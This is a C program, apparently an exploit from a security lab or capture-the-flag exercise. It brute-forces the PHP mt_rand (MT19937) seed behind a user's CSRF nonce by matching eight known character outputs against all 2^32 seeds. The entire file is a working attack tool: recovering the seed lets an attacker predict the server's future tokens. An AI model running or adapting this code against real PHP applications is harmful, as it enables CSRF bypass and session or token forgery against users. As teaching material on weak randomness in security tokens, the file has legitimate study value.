/*
 *
 * bruteforce_seed.c - Brute-force PHP MT19937 seed from known mt_rand(0,61) outputs.
 *
 * Compiles with: gcc -O3 -o bruteforce_seed bruteforce_seed.c
 * Usage: ./bruteforce_seed
 *
 * Searches all 2^32 seeds for one whose first 8 mt_rand(0,61) outputs
 * match the CSRF nonce of alice's request.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define MT_N 624
#define MT_M 397

static uint32_t mt[MT_N];
static int mt_idx;

static void mt_seed(uint32_t s) {
    mt[0] = s;
    for (int i = 1; i < MT_N; i++) {
        mt[i] = (uint32_t)(1812433253U * (mt[i-1] ^ (mt[i-1] >> 30)) + (uint32_t)i);
    }
    mt_idx = MT_N;
}

static void mt_generate(void) {
    int i;
    uint32_t y;
    for (i = 0; i < MT_N - MT_M; i++) {
        y = (mt[i] & 0x80000000U) | (mt[i+1] & 0x7FFFFFFFU);
        mt[i] = mt[i + MT_M] ^ (y >> 1);
        if (y & 1U) mt[i] ^= 0x9908b0dfU;
    }
    for (; i < MT_N - 1; i++) {
        y = (mt[i] & 0x80000000U) | (mt[i+1] & 0x7FFFFFFFU);
        mt[i] = mt[i + (MT_M - MT_N)] ^ (y >> 1);
        if (y & 1U) mt[i] ^= 0x9908b0dfU;
    }
    y = (mt[MT_N-1] & 0x80000000U) | (mt[0] & 0x7FFFFFFFU);
    mt[MT_N-1] = mt[MT_M-1] ^ (y >> 1);
    if (y & 1U) mt[MT_N-1] ^= 0x9908b0dfU;
}

static inline uint32_t mt_rand_uint32(void) {
    if (mt_idx >= MT_N) {
        mt_generate();
        mt_idx = 0;
    }
    uint32_t y = mt[mt_idx++];
    y ^= (y >> 11);
    y ^= (y <<  7) & 0x9d2c5680U;
    y ^= (y << 15) & 0xefc60000U;
    y ^= (y >> 18);
    return y;
}

/*
 * PHP mt_rand(0, 61) in MT_RAND_MT19937 mode on 64-bit systems.
 * On 64-bit PHP, the rejection limit is computed from ZEND_ULONG_MAX (2^64-1),
 * which is always larger than any 32-bit MT output, so no rejection occurs.
 * This simplifies to: raw_output % 62.
 */
static inline uint32_t mt_rand_0_61(void) {
    return mt_rand_uint32() % 62U;
}

int main(void) {
    /*
     * Expected first 8 mt_rand(0,61) outputs.
     * These correspond to alice's CSRF nonce "2swyMmD2" mapped through
     * the charset "9aGkR1mBvXpTnHcW4QYeZfLgUhJi0DO2Fs3dtKwN5oAlSbjMxEy7PqC8rIu6Vz".
     *   2=31, s=33, w=38, y=50, M=47, m=6, D=29, 2=31
     */
    const uint32_t expected[8] = {31, 33, 38, 50, 47, 6, 29, 31};

    fprintf(stderr, "Brute-forcing MT19937 seed (2^32 candidates)...\n");

    for (uint64_t seed = 0; seed < 0x100000000ULL; seed++) {
        mt_seed((uint32_t)seed);

        int match = 1;
        for (int i = 0; i < 8; i++) {
            if (mt_rand_0_61() != expected[i]) {
                match = 0;
                break;
            }
        }

        if (match) {
            fprintf(stderr, "FOUND seed: %u (0x%08X)\n",
                    (uint32_t)seed, (uint32_t)seed);
            printf("%u\n", (uint32_t)seed);
            return 0;
        }

        if ((seed & 0x0FFFFFFFU) == 0) {
            fprintf(stderr, "  progress: %.1f%%\n",
                    seed * 100.0 / 4294967296.0);
        }
    }

    fprintf(stderr, "ERROR: No matching seed found.\n");
    return 1;
}
